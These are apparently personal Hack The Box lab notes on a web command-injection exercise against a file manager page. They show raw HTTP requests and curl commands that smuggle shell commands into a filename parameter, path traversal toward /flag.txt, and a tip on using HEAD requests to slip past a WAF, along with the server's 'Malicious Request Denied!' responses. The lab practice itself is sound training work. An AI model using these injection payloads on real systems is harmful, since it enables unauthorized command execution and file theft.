# HTB_Web_Attack
```
POST /index.php?filename=file1%3B%20touch%20file2%3B  HTTP/1.1
Host: 94.237.60.55:34082
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 31

filename=file%3B+touch+file2%3B


```



## HTTP request method exploitation and url filtering 


```
POST /index.php?filename=file%3B%20cp%20%2Fflag.txt%20.%2F%3B HTTP/1.1
Host: 94.237.60.55:34082
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```



 ## Attempted combined traversal


 ```

# Try GET with ../ (might work when POST doesn't)
curl -X GET "http://83.136.253.201:36762/index.php?filename=../../flag.txt"

# Use HEAD to check existence without triggering WAF
curl -I -X HEAD "http://83.136.253.201:36762/index.php?filename=../../flag.txt"
```
<body>
    <div class="form-group">
        <h1>File Manager</h1>
        <form role="form" action="index.php" method="GET">
            <input type="text" class="form-control" placeholder="New File Name" name="filename">
        </form>
        <form action="admin/reset.php" method="GET">
            <input type="submit" value="Reset" class="btn btn-danger" />
        </form>
    </div>
</body>
</body>

</html>

<div></div><ul class="list-unstyled" id="file"><div><h3>Available Files:<h3></div><ul><li><h4><a href='notes.txt'>notes.txt</a></h4></li></ul>Malicious Request Denied!</ul




### malicious payload

``
curl -X GET "http://83.136.253.201:36762/index.php?filename=;cat+/flag.txt"

```
<body>
    <div class="form-group">
        <h1>File Manager</h1>
        <form role="form" action="index.php" method="GET">
            <input type="text" class="form-control" placeholder="New File Name" name="filename">
        </form>
        <form action="admin/reset.php" method="GET">
            <input type="submit" value="Reset" class="btn btn-danger" />
        </form>
    </div>
</body>
</body>

</html>

<div></div><ul class="list-unstyled" id="file"><div><h3>Available Files:<h3></div><ul><li><h4><a href='notes.txt'>notes.txt</a></h4></li></ul>Malicious Request Denied!</ul


